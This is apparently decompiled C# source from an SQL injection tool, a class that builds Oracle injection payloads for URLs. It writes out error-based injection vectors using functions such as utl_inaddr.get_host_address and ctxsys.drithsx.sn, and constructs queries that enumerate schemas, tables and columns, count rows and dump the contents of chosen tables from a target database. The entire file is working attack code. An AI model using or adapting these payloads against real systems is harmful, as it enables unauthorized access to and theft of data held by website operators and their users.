using System;
using System.Collections.Generic;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns0;

namespace DataBase
{
	// Token: 0x02000102 RID: 258
	public class Oracle
	{
		// Token: 0x0600111F RID: 4383 RVA: 0x00076884 File Offset: 0x00074A84
		private static string smethod_0(InjectionType injectionType_0, OracleErrorType oracleErrorType_0)
		{
			string text = "";
			string result;
			if (injectionType_0 == InjectionType.Error)
			{
				switch (oracleErrorType_0)
				{
				case OracleErrorType.NONE:
					text = "#";
					break;
				case OracleErrorType.GET_HOST_ADDRESS:
					text = "utl_inaddr.get_host_address(#)";
					break;
				case OracleErrorType.DRITHSX_SN:
					text = "ctxsys.drithsx.sn(1,#)";
					break;
				case OracleErrorType.GETMAPPINGXPATH:
					text = "ordsys.ord_dicom.getmappingxpath(#,1,1)";
					break;
				}
				result = text;
			}
			else
			{
				result = "#";
			}
			return result;
		}

		// Token: 0x06001120 RID: 4384 RVA: 0x000768E0 File Offset: 0x00074AE0
		public static string Info(string sTraject, InjectionType oMethod, OracleErrorType bError, List<string> lColumn, bool bCastAsChar, string sEndUrl = "")
		{
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			string str = Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				string text2;
				if (lColumn.Count == 1)
				{
					text2 = "(%K%||#||%K%)".Replace("#", text.Replace("#", lColumn[0].Trim()));
				}
				else
				{
					text2 = "";
					int num = lColumn.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text2 = text2 + "||" + str + "||";
						}
						string str2 = text.Replace("#", lColumn[i].Trim());
						text2 += str2;
					}
					text2 = "(%K%||#||%K%)".Replace("#", text2);
				}
				string text3 = Oracle.smethod_0(oMethod, bError);
				text3 = text3.Replace("#", text2.Replace("%K%", newValue));
				text3 = Class23.smethod_7(text3);
				return sTraject.Replace("[t]", text3) + sEndUrl;
			}
		}

		// Token: 0x06001121 RID: 4385 RVA: 0x00076A24 File Offset: 0x00074C24
		public static string DataBases(string sTraject, InjectionType oMethod, MySQLErrorType bError, bool bCastAsChar, bool bCorrentDB, string sWhere = "", string sOrderBy = "", string sEndUrl = "", List<string> lDBsAdded = null)
		{
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				string text2;
				if (bCorrentDB)
				{
					text2 = "(select " + text.Replace("#", "name") + "from v$database)";
				}
				else if (lDBsAdded.Count == 0)
				{
					text2 = "(select distinct owner from all_tables where rownum = 1)";
				}
				else
				{
					text2 = "(select distinct owner from all_tables where rownum = 1 and not owner in (";
					int num = lDBsAdded.Count - 1;
					for (int i = 0; i <= num; i++)
					{
						if (i > 0)
						{
							text2 += ",";
						}
						text2 += Class23.smethod_21(lDBsAdded[i], false, "||", "chr");
					}
					text2 += ")";
					if (!string.IsNullOrEmpty(sWhere))
					{
						text2 = text2 + " and " + sWhere;
					}
					if (!string.IsNullOrEmpty(sOrderBy))
					{
						text2 = text2 + " order by " + sOrderBy;
					}
					text2 += ")";
				}
				text2 = "(%K%||#||%K%)".Replace("#", text2);
				text2 = Oracle.smethod_0(oMethod, (OracleErrorType)bError).Replace("#", text2);
				text2 = text2.Replace("%K%", newValue);
				text2 = Class23.smethod_7(text2);
				return sTraject.Replace("[t]", text2) + sEndUrl;
			}
		}

		// Token: 0x06001122 RID: 4386 RVA: 0x00076BA8 File Offset: 0x00074DA8
		public static string Tables(string sTraject, InjectionType oMethod, MySQLErrorType bError, string sDataBase, bool bCastAsChar, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select table_name from (select rownum r, table_name from all_tables where owner = " + Class23.smethod_21(sDataBase, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), checked(iIndex + 1)), ")"));
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.smethod_0(oMethod, (OracleErrorType)bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = Class23.smethod_7(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		// Token: 0x06001123 RID: 4387 RVA: 0x00076CD8 File Offset: 0x00074ED8
		public static string Columns(string sTraject, InjectionType oMethod, MySQLErrorType bError, string sDataBase, string sTable, bool bCastAsChar, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "")
		{
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("(select column_name from (select rownum r, column_name from all_tab_columns where owner = " + Class23.smethod_21(sDataBase, false, "||", "chr") + " and table_name = " + Class23.smethod_21(sTable, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), checked(iIndex + 1)), ")"));
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.smethod_0(oMethod, (OracleErrorType)bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = Class23.smethod_7(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		// Token: 0x06001124 RID: 4388 RVA: 0x00076E20 File Offset: 0x00075020
		public static string Dump(string sTraject, InjectionType oMethod, OracleErrorType bError, string sDataBase, string sTable, List<string> lColumn, bool bCastAsChar, OracleTopN oTopN, int iIndex, string sWhere = "", string sOrderBy = "", string sEndUrl = "", string sCustomQuery = "")
		{
			string text = "";
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			string text2 = Class23.smethod_21(Class54.string_2, false, "||", "chr");
			string text3 = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			checked
			{
				if (!string.IsNullOrEmpty(sDataBase) & !string.IsNullOrEmpty(sTable))
				{
					string text4 = "";
					if (lColumn.Count == 1)
					{
						text4 = "(#) as t".Replace("#", lColumn[0].Trim());
					}
					else
					{
						int num = lColumn.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							if (i > 0)
							{
								text4 = text4 + "||" + text2 + "||";
							}
							text4 += lColumn[i].Trim();
						}
						text4 = "(#) as t".Replace("#", text4);
					}
					switch (oTopN)
					{
					case OracleTopN.ROWNUM:
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
						{
							"(select ",
							text3.Replace("#", "t"),
							" from (select rownum r, ",
							text4,
							" from %DB%.%TB%"
						}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where r = "), iIndex + 1), ")"));
						break;
					case OracleTopN.RANK:
					case OracleTopN.DENSE_RANK:
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
						{
							"(select ",
							text3.Replace("#", "t"),
							" from (select ",
							text4,
							", "
						}), Interaction.IIf(oTopN == OracleTopN.RANK, "rank()", "dense_rank()")), " over (order by "), lColumn[0]), " desc) sal_rank "), "from %DB%.%TB%"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), Interaction.IIf(string.IsNullOrEmpty(sOrderBy), "", " order by " + sOrderBy)), ") "), "where sal_rank = "), iIndex + 1), ")"));
						break;
					}
					text = text.Replace("%DB%", sDataBase);
					text = text.Replace("%TB%", sTable);
				}
				else
				{
					text = "(" + sCustomQuery + ")";
					text = text.Replace("[x]", Conversions.ToString(iIndex + 1));
					text = text.Replace("[s]", "||" + text2 + "||");
				}
				text = "(%K%||#||%K%)".Replace("#", text);
				text = Oracle.smethod_0(oMethod, bError).Replace("#", text);
				text = text.Replace("%K%", newValue);
				text = Class23.smethod_7(text);
				return sTraject.Replace("[t]", text) + sEndUrl;
			}
		}

		// Token: 0x06001125 RID: 4389 RVA: 0x000771A0 File Offset: 0x000753A0
		public static string Count(string sTraject, InjectionType oMethod, OracleErrorType bError, bool bCastAsChar, Schema o, string sDataBase, string sTable, string sWhere = "", string sEndUrl = "")
		{
			string text = "";
			string text2 = Conversions.ToString(Interaction.IIf(bCastAsChar, "cast(# as char(255))", "#"));
			string newValue = Class23.smethod_21(Class54.string_0, false, "||", "chr");
			Class23.smethod_21(Class54.string_2, false, "||", "chr");
			switch (o)
			{
			case Schema.DATABASES:
				text = "(select " + text2.Replace("#", "count(*)") + "from (select distinct owner from all_tables))";
				break;
			case Schema.TABLES:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject("(select " + text2.Replace("#", "count(*)") + "from all_tables where owner = " + Class23.smethod_21(sDataBase, false, "||", "chr"), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"));
				break;
			case Schema.COLUMNS:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"(select ",
					text2.Replace("#", "count(*)"),
					"from all_tab_columns where owner = ",
					Class23.smethod_21(sDataBase, false, "||", "chr"),
					" and table_name = ",
					Class23.smethod_21(sTable, false, "||", "chr")
				}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " and " + sWhere)), ")"));
				break;
			case Schema.ROWS:
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
				{
					"(select ",
					text2.Replace("#", "count(*)"),
					"from ",
					sDataBase,
					".",
					sTable
				}), Interaction.IIf(string.IsNullOrEmpty(sWhere), "", " where " + sWhere)), ")"));
				break;
			}
			text = "(%K%||#||%K%)".Replace("#", text);
			text = Oracle.smethod_0(oMethod, bError).Replace("#", text);
			text = text.Replace("%K%", newValue);
			text = Class23.smethod_7(text);
			return sTraject.Replace("[t]", text) + sEndUrl;
		}

		// Token: 0x040008A5 RID: 2213
		private static string string_0;

		// Token: 0x040008A6 RID: 2214
		private static string string_1;

		// Token: 0x040008A7 RID: 2215
		private static string string_2;

		// Token: 0x040008A8 RID: 2216
		private static string string_3;

		// Token: 0x040008A9 RID: 2217
		private static string string_4;

		// Token: 0x040008AA RID: 2218
		private static string string_5;
	}
}
